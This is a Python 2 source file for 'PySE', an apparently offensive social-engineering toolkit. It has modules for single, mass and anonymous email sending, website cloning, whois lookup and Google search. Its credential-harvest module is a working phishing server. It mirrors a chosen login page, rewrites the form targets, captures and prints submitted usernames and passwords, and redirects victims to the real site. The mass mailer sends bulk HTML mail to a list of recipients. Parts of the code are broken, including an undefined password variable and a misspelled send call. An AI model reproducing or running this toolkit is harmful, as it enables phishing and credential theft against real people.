#!/usr/bin/env python
#####################
# Improvements:
# Removed unused imports
# Used cmd instead of raw_input
# Used local color values
#####################
import os
import time
import sys
import smtplib
import urllib2
import io
import re
import pip
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import platform
import cmd
import random
import getpass
##### colors ######
W = '\033[0m'     # white (normal)
R = '\033[31m'    # red
G = '\033[32m'    # green
O = '\033[33m'    # orange
B = '\033[34m'    # blue
P = '\033[35m'    # purple
C = '\033[36m'    # cyan
LR = '\033[1;31m' # light red
LG = '\033[1;32m' # light green
LO = '\033[1;33m' # light orange
LB = '\033[1;34m' # light blue
LP = '\033[1;35m' # light purple
LC = '\033[1;36m' # light cyan
###################
try:
    import pythonwhois
    import mechanize
    from flask import Flask, request
    import requests
    from terminaltables import AsciiTable
    from google import search
except ImportError, e:
    print LR + "[!] Must run install script" + W
    print e
    exit(1)
banners = ['banner1', 'banner2']
banner1 = LG + """
______      _____ _____
| ___ \    /  ___|  ___|
| |_/ /   _\ `--.| |__
|  __/ | | |`--. \  __|
| |  | |_| /\__/ / |___
\_|   \__, \____/\____/
       __/ |
      |___/
""" + W + LR + """
 -- Made by @_t0x1c aka Filip --
 --     Edited by R3C0Nx00    --
 """ + W
banner2 = LP + """
 ___________________
< PySE is the best! >
 -------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\\
                ||----w |
                ||     ||
""" + W + LO + """
 -- Made by _t0x1c aka Filip --
 --  Edits made by R3C0Nx00  --
""" + W
def random_banner():
    banner_choice = random.choice(banners)
    if(banner_choice == 'banner1'):
        print banner1
    elif(banner_choice == 'banner2'):
        print banner2
    else:
        print LR + "[!] Developing error!" + W
random_banner()
options = """
== Available modules ==
mailer                +
massmailer            +
anonmailer            +
credharvest           +
website_source        +
website_info          +
google_query          +
help                  +
exit                  +
=======================
"""
print options
class pyse(cmd.Cmd):
    prompt = LP + "[PySE]>> " + W
    def do_mailer(self, line):
        if(line == 'text'):
            message = raw_input("[>] Message: ")
        elif(line == 'html'):
            html_file = raw_input("[>] Html file: ")

            with open(html_file) as f:
                lines = f.readlines()
            message = ''.join(lines)
        subject = raw_input("[>] Subject: ")
        towho = raw_input("[>] To: ")
        provider = raw_input("[>] Mail service provider: ")
        fromwho = raw_input("[>] From name: ")
        password_for_email = getpass.getpass(LG + "[?] Password for " + W + LR +  "%s: " % fromwho + W)
        msg = MIMEMultipart('alternative')
        msg['Subject'] = subject
        msg['From'] = fromwho
        msg['To'] = towho
        part2 = MIMEText(message, 'html')
        msg.attach(part2)
        try:
            print LG + "[+] Attempting to connect to: " + W + LR + "%s" % provider + W
            s = smtplib.SMTP(provider, 587)
            print LG + "[+] Starting TLS" + W
            s.starttls()
            s.login(fromwho, password)
            print LG + "[+] Sending mail" + W
            s.sendmail(fromwho, towho, msg.as_string())
            print LG + "[+] Mail sent to:" + W + LR + "%s" % towho + W
        except:
            print LR + "[!] Something happened :/" + W
    def do_massmailer(self, line):
        html_or_text = raw_input("[>] Html or text: ")
        if(html_or_text == 'text' or html_or_text == 'TEXT'):
            message = raw_input("[>] Message: ")
        elif(html_or_text == 'html' or html_or_text == 'HTML'):
            html_file = raw_input("[>] Html file: ")
            with open(html_file) as f:
                lines = f.readlines()
            message = ''.join(lines)
        else:
            print LR + "[!] Not a supported mail type" + W
        subject = raw_input("[>] Subject: ")
        toaddrs = emails
        provider = raw_input("[>] Mail service provider: ")
        fromwho = raw_input("[>] From name: ")
        password_for_email = getpass.getpass(LR + "[?] Password for: " + W + LR + "%s" % fromwho + W)
        with open(line, 'r') as f:
            emailsort = f.readlines()
            for user in emailsort:
                msg = MIMEMultipart('alternative')
                msg['Subject'] = subject
                msg['From'] = fromwho
                msg['To'] = user
                part2 = MIMEText(message, 'html')
                msg.attach(part2)
                try:
                    print LG + "[+] Attempting to connect to: " + W + LR + "%s" % provider + W
                    s = smtplib.SMTP(provider, 587)
                    print LG + "[+] Starting TLS" + W
                    s.starttls()
                    s.login(fromwho, password_for_email)
                    print LG + "[+] Sending mail" + W
                    s.semdmail(fromwho, user, msg.as_string())
                    print LG + "[*] Mail sent to: " + W + LR + "%s" % user + W
                except:
                    print LR + "[!] Something happened :/" + W
        f.close()
    def do_anonmailer(self, line):
         br = mechanize.Browser()
         towho = raw_input("[>] To: ")
         subject = raw_input("[>] Subject: ")
         message = raw_input("[>] Message: ")
         url = "https://anonymouse.org/anonemail.html"
         headers = "Mozilla/4.0 (compatible; MSIE 5.0; AOL 4.0; Windows 95; c_athome)"
         br.addheaders = [('User-agent', headers)]
         br.open(url)
         br.set_handle_equiv(True)
         br.set_handle_gzip(True)
         br.set_handle_redirect(True)
         br.set_handle_referer(True)
         br.set_handle_robots(False)
         br.set_debug_http(False)
         br.set_debug_redirects(False)
         br.select_form(nr=0)
         br.form['to'] = towho
         br.form['subject'] = subject
         br.form['text'] = message
         result = br.submit()
         response = br.response().read()
         if("The e-mail has been sent anonymously!" in response):
             print LG + "[*] Mail successfully sent to: " + W + LR + "%s" % towho + W
             print LG + "[*] They will recieve it in up to 12 hours!" + W
         else:
            print LR + "[!] Failed to send mail" + W
    def do_credharvest(self, line):
        url = raw_input("[>] Login phishing url: ")
        field1 = raw_input("[>] Username field: ")
        field2 = raw_input("[>] Password field: ")
        def FlaskPhish():
            def mirror():
		headers = {'user-agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36', 'Referer': '{}'.format(url)}
        	req = requests.get(url, headers=headers)
        	data = re.sub(r'(?<=action\=\")(.*?)\"', '/"', req.text)
        	return data

            def phish(email,password):
                print LG + "[*] CAUGHT POSSIBLE LOGIN CREDS" + W
                print LG + "[*] Email/Username: %s" % email + W
                print LG + "[*] Password: %s" % password + W
            pySE = Flask(__name__)
    	    @pySE.route('/', methods=['POST', 'GET'])
            def home():
                try:
                    if (request.method == 'POST'):
                        phish(request.form[field1], request.form[field2])
                        return '<script>window.location="{}";</script>'.format(url)
                    elif(request.method == 'GET'):
                        return mirror(), 200
                except Exception as e:
                    print LR + "[!] Something happened :/ : %s" % e + W
            if __name__ == "__main__":
                pySE.run(host='0.0.0.0', port=5000, threaded=True)
        FlaskPhish()
    def do_websitesource(self, line):
        url = line
        response = urllib2.urlopen(url)
        page_source = response.read()
        timestr = time.strftime("%Y%m%d-%H%M%S")
        with io.FileIO('source/%s' % timestr, 'w') as file:
            file.write(page_source)
        print LG + "[*] Finished cloning %s" % url + W
        print LG + "[*] Check source/ directory for html file" + W
    def do_websiteinfo(self, line):
        url = line
        domains = [url]
        for dom in domains:
            details = pythonwhois.get_whois(dom)
            print details['contacts']['registrant']
    def do_googlequery(self, line):
        topic = line
        try:
            for url in search(topic, tld='com', lang='en', stop=50):
                print LG + "[*] Site: " + W + LR + "%s" % url + W
        except:
            print "[!] Something happened! :/"
            print "Make sure to add the query to search for after 'googlequery'"
    def do_help(self, line):
        table_data = [
            ["pySE", "help menu"],
            ["mailer", "Send email (type [html or text])"],
            ["massmailer", "Send mass email (recipient file)"],
            ["anonmailer", "Send anonymous email"],
            ["credharvest", "Credential Harvester"],
            ["websitesource", "Website Source cloner (url [with https://])"],
            ["websiteinfo", "Info about a website (url)"],
            ["googlequery", "Search google for query (topic)"],
            ["help", "this menu"],
            ["exit", "exit pySE"],
        ]
        table = AsciiTable(table_data)
        print LB + table.table + W
    def do_exit(self, line):
        print LR + "[*] See ya later!" + W
        print LG + "[*] Made by _t0x1c, edits by R3C0Nx00!" + W
        exit(1)
    def do_EOF(self, line):
        print LR + "[*] See ya later!" + W
        print LG + "[*] Made by _t0x1c, edits by R3C0Nx00!" + W
        exit(1)
if  __name__ == "__main__":
    pyse().cmdloop()
